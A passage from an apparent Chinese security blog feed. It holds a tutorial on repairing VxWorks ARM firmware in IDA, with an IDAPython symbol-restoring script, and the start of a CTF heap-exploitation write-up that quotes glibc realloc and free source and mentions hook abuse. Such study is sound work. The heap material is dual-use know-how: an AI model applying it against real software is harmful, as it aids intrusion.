是VxWorks系统执行的第一段代码，它的主要工作是：关中断、设置usrInit()的栈、调用usrInit()，可以看到这个函数有几个关键的点：设置栈以及调用，所以必然会有两个很明显的操作，<strong>对栈进行操作，以及一次跳转（不保存返回地址的）</strong>，根据这个特征，可以看到此处确实存在这么一个现象，同时在VxWorks当中，程序一开始的入口地址和栈指针是指向同一个地方的，为什么等下再说，所以压栈的那个数值就是一直在找的程序入口地址，为下图的R0中的值：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/6.jpg" class=""><p>回过头看看这个问题：为什么程序一开始的入口地址和栈指针是指向同一个地方？</p><p>根据官方的文档（16页），initial stack是给usrInit()以及usrRoot()分配的栈空间，所以sysInit()中对栈的操作是给usrInit()做准备的，而usrInit()是程序的入口函数：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/8.jpg" class=""><p>所以初始化栈的地址同时也是固件的内存加载地址：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/7.png" class=""><ul><li><a href="https://www.cxybb.com/article/DanielLee_ustb/9098675">VxWorks启动代码usrInit ()函数分析 </a></li><li><a href="https://www.vxworks7.com/2021/10/vxworks7-boot-sequence.html">VxWorks 7的启动顺序</a></li><li><a href="https://www.uio.no/studier/emner/matnat/fys/FYS4220/h11/undervisningsmateriale/laboppgaver-rt/vxworks_architecture_supplement_6.2.pdf">VxWorks官方文档</a></li></ul><p>得到入口地址之后就可以重新打开IDA，在选择入口地址处填入刚刚得到的入口地址即可：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/18.png" class=""><h2 id="修复程序函数名"><a href="#修复程序函数名" class="headerlink" title="修复程序函数名"></a>修复程序函数名</h2><p>修复之前得找到符号表，有两种符号表的形式，一种是直接包括在整个文件当中，笔者称为<strong>内部符号表</strong>，还有一种是<strong>外部符号表</strong>，它可能散落在解包之后的某个文件当中，可以通过某个VxWorks特定的函数来定位符号表的位置，就比如在VxWorks中处理任务调度库函数的taskInit：</p><ul><li><a href="https://www.ee.ryerson.ca/~courses/ee8205/Data-Sheets/Tornado-VxWorks/vxworks/ref/taskLib.html">VxWorks中taskLib库函数集合</a></li></ul><p>下面分别是内部符号表和外部符号表的示例，内部符号表是NOE77101工控设备的固件中binwalk解压出来名为385的文件，外部还是本文最开始采用的固件</p><ul><li><a href="https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin">NOE77101工控设备固件</a></li></ul><h3 id="内部符号表"><a href="#内部符号表" class="headerlink" title="内部符号表"></a>内部符号表</h3><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/9.png" class=""><h3 id="外部符号表"><a href="#外部符号表" class="headerlink" title="外部符号表"></a>外部符号表</h3><p>当在分析的文件当中找不到符号表的时候，就可以考虑是不是在另一个文件当中，通过grep来寻找符号表文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  grep -r &quot;taskInit&quot;</span><br><span class="line">匹配到二进制文件 _wdr7660gv1-cn-up_2019-08-30_10.37.02.bin.extracted/15CBBA</span><br><span class="line">匹配到二进制文件 _NOE77101.bin.extracted/385</span><br></pre></td></tr></table></figure><p>修复程序的函数名，没有固定的脚本，可能每个架构的结构不同会导致脚本有些变化，具体还是看符号表的结构来修复，回到一开始的固件进行分析，先看看开头8个比特，0x00051B29为文件的大小，0x000034E4为符号表中符号的数量，剩下的符号表都是以8个比特来进行排列的</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/10.png" class=""><p>可以验证一下，0x00051B29为文件的大小：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/11.jpg" class=""><p>计算的方法：8（开头的8个bit）+ 8（每个符号的大小）* 13540（0x34E4）= 108328（0x1a728）</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/12.jpg" class=""><p>再回过头来看看符号的每个bit的作用：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/13.png" class=""><h3 id="符号类型"><a href="#符号类型" class="headerlink" title="符号类型"></a>符号类型</h3><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/14.png" class=""><p>具体可以看看下面的链接：</p><p><a href="http://www.360doc.com/content/13/0526/17/532901_288335598.shtml">符号类型详解</a></p><h3 id="符号的偏移"><a href="#符号的偏移" class="headerlink" title="符号的偏移"></a>符号的偏移</h3><p>符号开始的偏移为0，它将根据下一个符号的其实位置来寻找此符号到那里结束：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/15.jpg" class=""><p>知道了这些信息其实就可以写脚本了，大致的功能为将字符串从符号偏移中取出来，然后根据符号在内存中的位置来修改段的名字以及转换成伪代码，最后创建函数，脚本如下（在python2+IDA7.0版本下运行，python3+IDA7.5一直有点问题）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"></span><br><span class="line">symfile_path = <span class="string">&#x27;&#x27;</span>    </span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x1a728</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(symfile_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"></span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span>(<span class="params">offset</span>):</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span>():</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = <span class="built_in">int</span>(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = <span class="built_in">int</span>(symbol_item[-<span class="number">4</span>:].encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span>(<span class="params">symbols_meta_data</span>):</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">&#x27;\x54&#x27;</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><p>最后修复的结果，之后就能进行漏洞的挖掘了：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/16.png" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>修复VxWorks的流程大致如下，还有一些小的问题需要注意一下：</p><img src="/2022/02/04/%E5%A6%82%E4%BD%95%E5%AF%B9ARM%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84VxWorks%E7%B3%BB%E7%BB%9F%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E4%BF%AE%E5%A4%8D%EF%BC%9F/17.png" class=""><ul><li>要在确定好架构的大小端再进行分析，否则反汇编出来的指令看不出程序的入口点</li><li>可能每个架构的符号表的格式不太一样，并不是每个都能直接跑脚本就能出来的，还是得知其然知其所以然</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://eqqie.cn/index.php/archives/1780">基于 VxWorks 的 TP-Link 路由器固件的通用解压与修复思路</a></p><p><a href="https://github.com/p1Kk/idc-idapython"> idc-IDA_python</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从广东省强网杯--girlfriend中看realloc的艺术</title>
      <link href="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>很早就得知<code>realloc</code>一些特殊的作用，但一直以来都是硬套，导致有时候并不能很快的反应过来（太菜了…），所以在赛后对<code>realloc</code>做个整理，如果感兴趣的话就一起看下去吧！</p></blockquote><h4 id="realloc分析"><a href="#realloc分析" class="headerlink" title="realloc分析"></a><code>realloc</code>分析</h4><p>首先先通过源码来进行分析，下面的<code>libc-2.27</code>的<code>realloc</code>的源码，此函数位于<code>glibc-2.27-master\malloc\malloc.c</code>，为了更好理解删除了一下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_realloc (<span class="keyword">void</span> *oldmem, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* chunk corresponding to oldmem */</span></span><br><span class="line">  <span class="keyword">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((__builtin_expect ((<span class="keyword">uintptr_t</span>) oldp &gt; (<span class="keyword">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">      &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;realloc(): invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If this is a faked mmapped chunk from the dumped main arena,</span></span><br><span class="line"><span class="comment"> always make a copy (and do not free the old chunk).  */</span></span><br><span class="line">      <span class="keyword">if</span> (DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">  <span class="keyword">void</span> *newmem = __libc_malloc (bytes);</span><br><span class="line">  <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">/* Copy as many bytes as are available from the old chunk</span></span><br><span class="line"><span class="comment">     and fit into the new size.  NB: The overhead for faked</span></span><br><span class="line"><span class="comment">     mmapped chunks is only SIZE_SZ, not 2 * SIZE_SZ as for</span></span><br><span class="line"><span class="comment">     regular mmapped chunks.  */</span></span><br><span class="line">  <span class="keyword">if</span> (bytes &gt; oldsize - SIZE_SZ)</span><br><span class="line">    bytes = oldsize - SIZE_SZ;</span><br><span class="line">  <span class="built_in">memcpy</span> (newmem, oldmem, bytes);</span><br><span class="line">  <span class="keyword">return</span> newmem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">void</span> *newmem;</span><br><span class="line">      <span class="comment">/* Note the extra SIZE_SZ overhead. */</span></span><br><span class="line">      <span class="keyword">if</span> (oldsize - SIZE_SZ &gt;= nb)</span><br><span class="line">        <span class="keyword">return</span> oldmem;                         <span class="comment">/* do nothing */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Must alloc, copy, free. */</span></span><br><span class="line">      newmem = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;              <span class="comment">/* propagate failure */</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">memcpy</span> (newmem, oldmem, oldsize - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">      munmap_chunk (oldp);</span><br><span class="line">      <span class="keyword">return</span> newmem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">      ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (newp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Try harder to allocate memory in other arenas.  */</span></span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, <span class="number">2</span>, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      <span class="keyword">if</span> (newp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_realloc)</span><br></pre></td></tr></table></figure><p>它和<code>malloc</code>和<code>free</code>都有同样的特性，就是当<code>xxx_hook</code>不为空的时候要去执行存放在<code>xxx_hook</code>里面的函数，熟悉<code>realloc</code>调整栈帧的都明白这个，并且还利用了<code>__builtin_expect</code>来优化，具体可以看下面的链接：</p><p><a href="https://blog.csdn.net/GrubLinux/article/details/37543489">__builtin_expect详解</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) =</span><br><span class="line">  atomic_forced_read (__realloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>下面的代码就是它的特性之一，查找定义得知<code>#define REALLOC_ZERO_BYTES_FREES 1</code>，所以当<code>bytes</code>（也就是size）为0，且<code>oldmem</code>不为空的时候就执行<code>__libc_free</code>，同时<code>return 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>__libc_free</code>先进行一些检查，之后就进入<code>_int_free</code>里面，也就是平常所说到的<code>free</code>函数，也就是说<code>realloc</code>在某些特性情况下是可以充当<code>free</code>函数来使用的！其实也很好理解，就是重新调整堆块的大小为0，那既然堆块的大小都为0了，不就等于<code>free</code>了吗？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span 